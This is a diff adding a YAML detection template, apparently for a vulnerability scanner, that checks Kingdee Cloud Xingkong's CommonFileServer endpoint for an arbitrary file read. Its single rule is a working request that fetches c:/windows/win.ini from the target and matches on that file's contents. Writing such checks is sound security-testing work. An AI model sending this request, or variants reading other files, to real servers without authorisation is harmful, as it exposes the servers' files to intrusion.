@@ -1,0 +1,20 @@
+id: 金蝶云星空CommonFileserver任意文件读取漏洞
+info:
+    author: 小黑子
+    description: |
+        app="金蝶云星空-管理中心"
+    name: 金蝶云星空CommonFileserver任意文件读取漏洞
+    severity: critical
+    tags:
+        - 金蝶云星空
+        - Eserv
+        - eserv
+    verified: true
+rules:
+    r0:
+        matcher: '"files" in res.text and "fonts" in res.text and res.status_code==200'
+        request:
+            headers:
+                User-Agent: Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)
+            method: GET
+            path: /CommonFileServer/c:/windows/win.ini
